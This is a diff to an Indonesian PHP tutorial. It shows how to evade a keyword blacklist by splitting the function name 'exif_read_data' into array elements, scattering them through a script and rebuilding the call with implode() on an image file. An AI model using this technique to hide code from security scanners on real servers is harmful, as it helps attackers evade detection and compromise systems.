@@ -35,7 +35,11 @@ dan bila kata fixe juga di blacklist maka bisa di bypass dengan manjadikan tiap 
 ```php
 implode("",["e","x","i","f","_","r","e","a","d","_","d","a","t","a"])("bunglon.jpg")
 ```
-dan bila array berikut '"e","x","i","f","_","r","e","a","d","_","d","a","t","a"' di blacklist maka pecah saja menjadi
+dan bila array berikut 
+```
+'"e","x","i","f","_","r","e","a","d","_","d","a","t","a"' 
+```
+di blacklist maka pecah saja menjadi
 ```php
 $kata[] = "e";
 $kata[] = "x";
@@ -52,7 +56,27 @@ $kata[] = "a";
 $kata[] = "t";
 $kata[] = "a";
 ```
-lalu sebarkan :v di beda line script asal urutannya benar pasti functionnya kembali seperti semula
+
+lalu sebarkan :v di beda line script asal urutannya benar pasti functionnya kembali seperti semula namun bila takut tak urut maka masukan keynya saja sehingga menjadi seperti berikut ini
+
+```php
+$kata[0] = "e";
+$kata[1] = "x";
+$kata[2] = "i";
+$kata[3] = "f";
+$kata[4] = "_";
+$kata[5] = "r";
+$kata[6] = "e";
+$kata[7] = "a";
+$kata[8] = "d";
+$kata[9] = "_";
+$kata[10] = "d";
+$kata[11] = "a";
+$kata[12] = "t";
+$kata[13] = "a";
+```
+
+lalu sebar sesuka anda dan di line berapa pun nanti ketika di implode akan kembali. 
 
 ```php
 implode("",$kata)("bunglon.jpg")
